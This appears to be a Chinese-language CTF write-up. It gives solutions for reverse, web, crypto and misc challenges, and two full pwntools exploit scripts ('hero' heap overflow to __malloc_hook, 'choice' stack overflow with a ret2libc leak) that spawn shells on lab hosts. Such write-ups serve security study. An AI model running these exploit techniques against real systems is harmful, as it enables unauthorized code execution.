# reverse miao

把输入的最高位比特置为1，逆向是再置为0即可

```
s = [0xE6, 0xEC, 0xE1, 0xE7, 0xBA, 0xF4, 0xE5, 0xF3, 0xF4, 0xF4, 0xE5, 0xF3, 0xF4]

for i, v in enumerate(s):
    print(chr(v & 0x7F), end='')

```

# reverse revGen

使用双向链表存储输入，加密后逆序存储为密文进行比较

```
'''
  0x68, 0x21, 0x29, 0x24, 0x70, 0x61, 0x37, 0x61, 0x33, 0x33, 
  0x23, 0x74, 0x75, 0x26, 0x78, 0x01, 0x50, 0x57, 0x0A, 0x55, 
  0x16, 0x16, 0x42, 0x47, 0x13, 0x73, 0x25, 0x70, 0x70, 0xFC, 
  0xEA, 0x40, 0x50, 0x2E, 0x23, 0x52, 0x4E, 0x77, 0x9E, 0x00, 
  0x70, 0xF7, 0x9E, 0x00
'''

s = [
    0x68, 0x21, 0x29, 0x24, 0x70, 0x61, 0x37, 0x61, 0x33, 0x33,
    0x23, 0x74, 0x75, 0x26, 0x78, 0x01, 0x50, 0x57, 0x0A, 0x55,
    0x16, 0x16, 0x42, 0x47, 0x13, 0x73, 0x25, 0x70, 0x70, 0xFC,
    0xEA, 0x40, 0x50, 0x2E, 0x23, 0x52, 0x4E, 0x77
]

k = [
    0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99, 0x12,
    0x13, 0x14, 0x15, 0x21, 0x22, 0x23, 0x24, 0x25, 0x31, 0x32,
    0x33, 0x34, 0x35, 0x41, 0x42, 0x43, 0x44, 0x45, 0x51, 0x52,
    0x53, 0x54, 0x55, 0x12, 0x13, 0x11, 0x14, 0x15
]

s.reverse()
for i, v in enumerate(s):
    print(chr(v ^ k[i]), end='')

```

# web decrypt

逆序、base64、rot13、ascii加一，按encode的逻辑写decode逻辑即可。

```
import base64
import string

s = list('=pJovuTsWOUrtIJZtcKZ2OJMzEJZyMTLdIas')
print(''.join(s))
for i, v in enumerate(s):
    if s[i] in string.ascii_lowercase:
        s[i] = chr(((ord(s[i]) - ord('a') - 13) % 26) + ord('a'))
    elif s[i] in string.ascii_uppercase:
        s[i] = chr(((ord(s[i]) - ord('A') - 13) % 26) + ord('A'))
    else:
        pass

s = list(s[::-1])
print(''.join(s))
sb1 = list(base64.b64decode(''.join(s)).decode('ascii'))
print(''.join(sb1))
for i, v in enumerate(sb1):
    sb1[i] = chr(ord(sb1[i]) - 1)

print(''.join(sb1[::-1]))
```

# crypto rsa

```
import gmpy2
import Crypto.Util.number

n = 920139713
e = 19
c = [704796792, 
     752211152,
     274704164,
     18414022,
     368270835,
     483295235,
     263072905,
     459788476,
     483295235,
     459788476,
     663551792,
     475206804,
     459788476,
     428313374,
     475206804,
     459788476,
     425392137,
     704796792,
     458265677,
     341524652,
     483295235,
     534149509,
     425392137,
     428313374,
     425392137,
     341524652,
     458265677,
     263072905,
     483295235,
     828509797,
     341524652,
     425392137,
     475206804,
     428313374,
     483295235,
     475206804,
     459788476,
     306220148]

p = 18443
q = 49891
phi = (p-1)*(q-1)
d = gmpy2.invert(e, phi)
flag = b""
for _c in c:
    m = pow(_c, d, n)
    flag += Crypto.Util.number.long_to_bytes(m)
print(flag)

```

# misc 奇怪的图片

```
zsy@ubuntu:/mnt/hgfs/D/CTF/天津2021/2022F$ strings misc.rar 
Rar!
LGCTF/flag.txt0
k8\GU
P(v;
nJly
ACL0
og*(
LGCTF
ACL0
)f/I
IHDR
sRGB
gAMA
	pHYs
IDATx^
pL{8
DFV"q
D"##
Nf'G
)OY,"R
uLbe
"-f1[
-XmX
Svt4
1.?h
v|@/
quue
eq[nnnx
{<<<
]__sSe
C@Y\
p{{k/
7ea;
VI`9/
77ea;
'x5P
v!<4n
rb>_
666C61677B4A7573745F65617379217DD
^iua
-xxx
n}k@:
%NNNv
V[`9
///Y
3Zuz~~
pVa`9
2+Z7
k6EA
5.btk(5@
w\G|
'pS9a
N~xu
^>V%
EAVa`y
Sl|Gggg
Veq	
]\5fq
2NaD
U+5d
BK-Xd
!c-0
p~gU
BY,m
PLY>")
y4JY,mc
'''M,
NY,m
ZEs"e
LY,RX7
A|~~
BY,R
P\\\t
I%\,
)OY,"R
)OY,"R
IEND
TEdDVEYlN0JkR2hwYzE5cGMxOWhYM2R5YjI1blgyWnNZV2NsTWpFJTNEJTdE
```

有一个`666C61677B4A7573745F65617379217DD`，将这个十六进制字符串转换为bytes

```
a = '666C61677B4A7573745F65617379217DD'
flag = ''

for i in range(0, len(a), 2):
    print(int(a[i:i+2], 16).to_bytes(1, 'little'))


```

# pwn - hero

单字节溢出，最后改__realloc_hook和__malloc_hook

```python
from pwn import*
elf = ELF('hero')
#libc = elf.libc
libc = ELF('libc_64.so')
#p = process('./hero')
p = remote('172.31.1.105',50005)
context.log_level = 'debug'

def add(name, power):
    p.sendlineafter(b'choice:', b'1')
    p.sendafter(b'name:', name)
    p.sendafter(b'power:', power)
def show(index):
    p.sendlineafter(b'choice:', b'2')
    p.sendlineafter(b'show?', str(index).encode())
def edit(index, name, power):
    p.sendlineafter(b'choice:', b'3')
    p.sendlineafter(b'edit?', str(index).encode())
    p.sendafter(b'name:', name)
    p.sendafter(b'power:', power)
def delete(index):
    p.sendlineafter(b'choice:', b'4')
    p.sendlineafter(b'remove?', str(index).encode())

add(b'a', b'a')
add(b'a', b'a')
add(b'a', b'a')
delete(0)
payload = b'a' * 0x60 + p64(0x170)
edit(1, payload, b'a')
show(1)
leak = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
libcbase = leak - 88 - 0x10 - libc.sym['__malloc_hook']
malloc_hook = libcbase + libc.sym['__malloc_hook']
libc_reallo = libcbase + 0x846c0
onegadget = libcbase + 0xf1117

add(b'a', b'a')
edit(1 ,b'a', b'a')
delete(1)
delete(0)
add(p64(malloc_hook - 0x23), b'a')
add(b'a', b'a')
add(b'a', b'a')
payload = b'\x00' * 11 + p64(onegadget) + p64(libc_reallo + 6)
add(payload ,b'a')
#gdb.attach(p)
#pause()
p.sendlineafter(b'choice:', b'1')
print(hex(libcbase))
#pause()
p.interactive()
```

# choice

32位程序，给了libc。存在一个一字节溢出，导致byte_804A04C可以溢出修改nbytes大小。后面的话就传统栈溢出做法。先puts出libc基址再执行onegadget，onegadget第三个有效。

```
from pwn import *
from LibcSearcher import*
import sys
reomote_addr=["172.31.3.31",10001]
libc=ELF('./libc-2.23.so')
if len(sys.argv)==1:
    context.log_level="debug" 
    # p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
   # p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p=process("./choice")
    context(arch = 'i386', os = 'linux')
if len(sys.argv)==2 :
    if 'r' in sys.argv[1]:
        p = remote(reomote_addr[0],reomote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        context(arch = 'i386', os = 'linux')
r = lambda : p.recv()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

def debug():
    if len(sys.argv)==1:
        gdb.attach(p)
        pause()
#debug()
pop_edi_edp=0x080487da
puts_got=0x0804A01C
puts_plt=0x8048430
ret=0x080483c2
sa('Please enter your name:',b'a'*0x14+p8(0xf0))
#debug()
sl('1')
payload=b'a'*0x1c+p32(0x804A100)+p32(puts_plt)+p32(0x804857B)+p32(puts_got)
#payload=b'a'*0x1c+p32(0x804A100)+p32(0x80485B0)+p32(puts_got)+p32(0x804A100)+p32(0x804857B)
#debug()
sla('choice it?',payload)
ru('Good bye!')
puts=u32(p.recvuntil('\xf7')[-4:])
pr('puts',puts)
#puts_addr = p.recvuntil('\nOK\n', drop=True).ljust(8, '\x00')
#puts=u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
libcbase=puts-libc.symbols['puts']
pr("libc",libcbase)
system=libcbase+0x3a812
payload2=b'a'*0x1c+p32(0x804A100)+p32(system)
sla('choice it?',payload2)
shell()
```
